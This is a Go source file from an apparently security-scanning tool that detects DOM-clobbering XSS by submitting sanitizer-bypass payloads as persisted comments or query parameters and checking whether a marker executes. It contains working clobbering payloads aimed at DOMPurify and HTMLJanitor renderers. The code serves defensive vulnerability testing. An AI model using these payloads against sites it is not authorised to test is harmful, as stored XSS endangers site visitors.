package scan

import (
	"context"
	"encoding/json"
	"maps"
	"net/url"
	"strings"
	"time"

	"github.com/indago/indago/internal/browser"
	"github.com/indago/indago/internal/detection"
	"github.com/indago/indago/internal/domain"
	"github.com/indago/indago/internal/verification"
)

const domClobberingMaxReadOnlySelectors = 2

// domXSSClobberingCommentForm detects a comment renderer that sanitises with
// DOMPurify or HTMLJanitor and exposes an add-comment form. The clobbering
// payload has to be persisted, so the probe submits it and reloads the post.
func domXSSClobberingCommentForm(html string) bool {
	low := strings.ToLower(html)
	if !strings.Contains(low, "loadcomments") || !strings.Contains(low, "post/comment") {
		return false
	}
	return strings.Contains(low, "dompurify") || strings.Contains(low, "htmljanitor")
}

func domXSSClobberingPayload(html, marker string) (payload, fragment string) {
	if strings.Contains(strings.ToLower(html), "htmljanitor") {
		id := "x" + marker
		return `<form id=` + id + ` tabindex=0 onfocus=` + marker + `><input id=attributes>`, "#" + id
	}
	return `<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=` + marker + `//">`, ""
}

func (e *domXSSExecutor) probeDOMClobbering(ctx context.Context, bctx *browser.Context, job *domain.TestJob, ep *domain.Endpoint, marker, pageHTML string) {
	e.probeDOMClobberingWithScripts(ctx, bctx, job, ep, marker, domXSSPageScripts{HTML: pageHTML}, nil)
}

func (e *domXSSExecutor) probeDOMClobberingWithScripts(ctx context.Context, bctx *browser.Context, job *domain.TestJob, ep *domain.Endpoint, marker string, pageScripts domXSSPageScripts, selectors []domXSSQuerySelector) {
	surfaces := detection.DetectDOMClobberingSurfaces(pageScripts.HTML, pageScripts.Scripts)
	if len(surfaces) == 0 && domXSSClobberingCommentForm(pageScripts.HTML) {
		surfaces = []detection.DOMClobberingSurface{{Kind: detection.DOMClobberDOMPurifyAvatar, GlobalName: "defaultAvatar", PropertyName: "avatar"}}
	}
	if len(surfaces) == 0 {
		return
	}

	// The persisted payload must not share the DOM probes' marker: once it is
	// in the page, every later source probe would otherwise see it execute and
	// confirm itself from the clobbering comment.
	clobberMarker := "clb" + strings.TrimPrefix(marker, "ind")

	forms := detection.ExtractDOMClobberingForms(pageScripts.HTML, ep.URL)
	legacyCommentForm := domXSSClobberingCommentForm(pageScripts.HTML)
	if len(forms) > 0 || legacyCommentForm {
		// Persisted form submission is state-changing. Check policy BEFORE
		// opening any browser page so a read-only scan never touches the
		// browser context's method gate.
		if !e.allowStateChanging || e.skipWriteEndpoints {
			reason := "AllowStateChanging is off"
			if e.allowStateChanging {
				reason = "SkipWriteEndpoints is on"
			}
			tc := e.newTestCase(ctx, job, ep.URL)
			tc.Status = domain.TestCaseSkipped
			e.finishTestCase(ctx, tc, nil, "DOM clobbering probe skipped: it must persist a comment through a browser POST, and "+reason)
			return
		}
		if e.probePersistedDOMClobbering(ctx, bctx, job, ep, clobberMarker, pageScripts.HTML, surfaces, forms, legacyCommentForm) {
			return
		}
	}

	// Read-only fallback: if the endpoint has query selectors and a detected
	// clobbering surface, test whether a query parameter renders sanitized HTML
	// that clobbers the surface on load.
	if len(selectors) > 0 {
		e.probeReadOnlyDOMClobbering(ctx, bctx, job, ep, clobberMarker, surfaces, selectors)
	}
}

func (e *domXSSExecutor) probePersistedDOMClobbering(
	ctx context.Context,
	bctx *browser.Context,
	job *domain.TestJob,
	ep *domain.Endpoint,
	clobberMarker string,
	pageHTML string,
	surfaces []detection.DOMClobberingSurface,
	forms []detection.DOMClobberingForm,
	legacyCommentForm bool,
) bool {
	var specs []detection.DOMClobberingPayloadSpec
	for _, s := range surfaces {
		specs = append(specs, detection.DOMClobberingPayloadsFor(s, clobberMarker)...)
	}
	if len(specs) == 0 {
		p, frag := domXSSClobberingPayload(pageHTML, clobberMarker)
		specs = []detection.DOMClobberingPayloadSpec{{Payload: p, Fragment: frag}}
	}

	for _, spec := range specs {
		tc := e.newTestCase(ctx, job, ep.URL)
		page, err := bctx.NewPage(ctx)
		if err != nil {
			e.finishTestCase(ctx, tc, err, "clobbering probe: new page")
			return false
		}
		if _, err := page.Navigate(ctx, ep.URL, browser.NavOptions{Limiter: e.limiter, WaitUntil: browser.WaitLoad}); err != nil {
			page.Close()
			e.finishTestCase(ctx, tc, err, "clobbering probe: load post")
			return false
		}
		html, _ := page.Content(ctx)
		freshForms := detection.ExtractDOMClobberingForms(html, ep.URL)
		var action string
		var fields map[string]string
		var followerFields map[string]string

		if len(freshForms) > 0 {
			f := freshForms[0]
			action = f.Action
			fields = make(map[string]string, len(f.HiddenFields)+len(f.ExtraFields)+1)
			maps.Copy(fields, f.HiddenFields)
			maps.Copy(fields, f.ExtraFields)
			fields[f.TextField] = spec.Payload
		} else if legacyCommentForm {
			csrf := domXSSHiddenValue(html, "csrf")
			postID := domXSSHiddenValue(html, "postId")
			if csrf == "" || postID == "" {
				page.Close()
				e.finishTestCase(ctx, tc, nil, "clobbering probe: comment form has no csrf/postId field")
				return false
			}
			base, _ := url.Parse(ep.URL)
			action = base.Scheme + "://" + base.Host + "/post/comment"
			fields = map[string]string{
				"csrf": csrf, "postId": postID, "comment": spec.Payload,
				"name": "indago", "email": "indago@example.com", "website": "https://example.com",
			}
		} else {
			page.Close()
			e.finishTestCase(ctx, tc, nil, "clobbering probe: no POST form available")
			return false
		}

		if _, err := page.NavigateForm(ctx, "POST", action, fields, browser.NavOptions{Limiter: e.limiter, WaitUntil: browser.WaitLoad}); err != nil {
			page.Close()
			e.finishTestCase(ctx, tc, err, "clobbering probe: submit comment")
			return false
		}

		// The clobbered global only exists once the payload comment is attached
		// to the document; a comment renderer may read it while building the
		// NEXT comment. Post one harmless follower when a comment form is present.
		if _, err := page.Navigate(ctx, ep.URL, browser.NavOptions{Limiter: e.limiter, WaitUntil: browser.WaitLoad}); err == nil {
			if h, herr := page.Content(ctx); herr == nil {
				reloadedForms := detection.ExtractDOMClobberingForms(h, ep.URL)
				if len(reloadedForms) > 0 {
					rf := reloadedForms[0]
					followerFields = make(map[string]string, len(rf.HiddenFields)+len(rf.ExtraFields)+1)
					maps.Copy(followerFields, rf.HiddenFields)
					maps.Copy(followerFields, rf.ExtraFields)
					followerFields[rf.TextField] = "indago follower"
					_, _ = page.NavigateForm(ctx, "POST", rf.Action, followerFields, browser.NavOptions{Limiter: e.limiter, WaitUntil: browser.WaitLoad})
				} else if csrf2 := domXSSHiddenValue(h, "csrf"); csrf2 != "" {
					postID := domXSSHiddenValue(h, "postId")
					follow := map[string]string{
						"csrf": csrf2, "postId": postID, "comment": "indago follower",
						"name": "indago", "email": "indago@example.com", "website": "https://example.com",
					}
					_, _ = page.NavigateForm(ctx, "POST", action, follow, browser.NavOptions{Limiter: e.limiter, WaitUntil: browser.WaitLoad})
				}
			}
		}
		page.Close()

		obsPage, err := e.openObservedPage(ctx, bctx, clobberMarker)
		if err != nil {
			e.finishTestCase(ctx, tc, err, "clobbering probe: observed page")
			return false
		}
		target := ep.URL + spec.Fragment
		if _, err := obsPage.Navigate(ctx, target, browser.NavOptions{Limiter: e.limiter, WaitUntil: browser.WaitLoad}); err != nil {
			obsPage.Close()
			e.finishTestCase(ctx, tc, err, "clobbering probe: reload post")
			return false
		}
		if spec.Fragment != "" {
			if _, err := obsPage.Evaluate(ctx, `(() => { const el = document.getElementById(`+goQuoteJS(strings.TrimPrefix(spec.Fragment, "#"))+`); if (el && el.focus) el.focus(); })()`); err != nil {
				obsPage.Close()
				e.finishTestCase(ctx, tc, err, "clobbering probe: focus the clobbered element")
				return false
			}
		}
		obs, err := observePage(ctx, obsPage, 2*time.Second)
		if err != nil {
			obsPage.Close()
			e.finishTestCase(ctx, tc, err, "clobbering probe: observe")
			return false
		}
		_, _, matched := verification.MatchRuntimeExecution(clobberMarker, obs.Runtime)
		if !matched {
			obsPage.Close()
			e.finishTestCase(ctx, tc, nil, "clobbering probe: the persisted comment did not execute the marker")
			continue
		}
		out, _ := obsPage.Content(ctx)
		shot, _ := obsPage.Screenshot(ctx, browser.ScreenshotOptions{})
		obsPage.Close()
		evIDs, _ := e.persistDOMXSSEvidence(ctx, job.ScanID, tc.ID, shot, out, []string{"clobbering payload persisted: " + spec.Payload})
		detail, _ := json.Marshal(map[string]any{
			"source": "comment_html", "sink": "dom_clobbering", "payload": spec.Payload,
			"test_case_ids": []domain.ID{tc.ID},
		})
		f := &domain.Finding{
			ID: domain.NewID(), ScanID: job.ScanID, ProjectID: e.projectIDFor(ctx, job.ScanID),
			VulnClass: domain.VulnDOMXSS, Verdict: domain.VerdictConfirmed,
			Severity: domain.SeverityHigh, Confidence: domain.ConfidenceHigh,
			Title:      "DOM clobbering: a persisted comment executes script in the page",
			Summary:    "A comment carrying a clobbering payload was accepted by the page's sanitizer and executed after reload.",
			EndpointID: ep.ID, EvidenceIDs: evIDs,
			Provenance: domain.Provenance{Engine: "dom-clobbering", DiscoverySource: ep.Source, DetectedAt: time.Now(), VerifiedAt: ptrTime(time.Now())},
			Detail:     detail, CreatedAt: time.Now(), UpdatedAt: time.Now(),
		}
		tc.Status = domain.TestCaseCompleted
		if err := e.store.Findings().Create(ctx, f); err != nil {
			e.finishTestCase(ctx, tc, err, "clobbering probe: create finding")
			return false
		}
		e.finishTestCase(ctx, tc, nil, "confirmed: clobbering comment executed the marker after reload")
		return true
	}
	return false
}

func (e *domXSSExecutor) probeReadOnlyDOMClobbering(
	ctx context.Context,
	bctx *browser.Context,
	job *domain.TestJob,
	ep *domain.Endpoint,
	clobberMarker string,
	surfaces []detection.DOMClobberingSurface,
	selectors []domXSSQuerySelector,
) {
	if bctx == nil || len(surfaces) == 0 || len(selectors) == 0 {
		return
	}
	specs := detection.DOMClobberingPayloadsFor(surfaces[0], clobberMarker)
	if len(specs) == 0 {
		return
	}
	spec := specs[0]
	limit := min(len(selectors), domClobberingMaxReadOnlySelectors)
	for _, sel := range selectors[:limit] {
		if sel.Name == "" {
			continue
		}
		navURL := domXSSQueryURL(ep.URL, sel.Name, spec.Payload) + spec.Fragment
		tc := e.newTestCase(ctx, job, navURL)
		obsPage, err := e.openObservedPage(ctx, bctx, clobberMarker)
		if err != nil {
			e.finishTestCase(ctx, tc, err, "clobbering probe: observed page")
			return
		}
		if _, err := obsPage.Navigate(ctx, navURL, browser.NavOptions{Limiter: e.limiter, WaitUntil: browser.WaitLoad}); err != nil {
			obsPage.Close()
			e.finishTestCase(ctx, tc, err, "clobbering probe: navigate")
			continue
		}
		if spec.Fragment != "" {
			_, _ = obsPage.Evaluate(ctx, `(() => { const el = document.getElementById(`+goQuoteJS(strings.TrimPrefix(spec.Fragment, "#"))+`); if (el && el.focus) el.focus(); })()`)
		}
		obs, err := observePage(ctx, obsPage, 1500*time.Millisecond)
		if err != nil {
			obsPage.Close()
			e.finishTestCase(ctx, tc, err, "clobbering probe: observe")
			continue
		}
		_, _, matched := verification.MatchRuntimeExecution(clobberMarker, obs.Runtime)
		if !matched {
			obsPage.Close()
			e.finishTestCase(ctx, tc, nil, "clobbering probe: query payload did not execute the marker")
			continue
		}
		out, _ := obsPage.Content(ctx)
		shot, _ := obsPage.Screenshot(ctx, browser.ScreenshotOptions{})
		obsPage.Close()
		evIDs, _ := e.persistDOMXSSEvidence(ctx, job.ScanID, tc.ID, shot, out, []string{"clobbering payload reflected: " + spec.Payload})
		detail, _ := json.Marshal(map[string]any{
			"source": "query", "param": sel.Name, "sink": "dom_clobbering", "payload": spec.Payload,
			"test_case_ids": []domain.ID{tc.ID},
		})
		f := &domain.Finding{
			ID: domain.NewID(), ScanID: job.ScanID, ProjectID: e.projectIDFor(ctx, job.ScanID),
			VulnClass: domain.VulnDOMXSS, Verdict: domain.VerdictConfirmed,
			Severity: domain.SeverityHigh, Confidence: domain.ConfidenceHigh,
			Title:      "DOM clobbering: injected markup clobbers a page global and executes script",
			Summary:    "A DOM clobbering payload supplied via query parameter " + sel.Name + " survived sanitization and executed.",
			EndpointID: ep.ID, EvidenceIDs: evIDs,
			Provenance: domain.Provenance{Engine: "dom-clobbering", DiscoverySource: ep.Source, DetectedAt: time.Now(), VerifiedAt: ptrTime(time.Now())},
			Detail:     detail, CreatedAt: time.Now(), UpdatedAt: time.Now(),
		}
		tc.Status = domain.TestCaseCompleted
		if err := e.store.Findings().Create(ctx, f); err != nil {
			e.finishTestCase(ctx, tc, err, "clobbering probe: create finding")
			return
		}
		e.finishTestCase(ctx, tc, nil, "confirmed: clobbering query payload executed the marker")
		return
	}
}
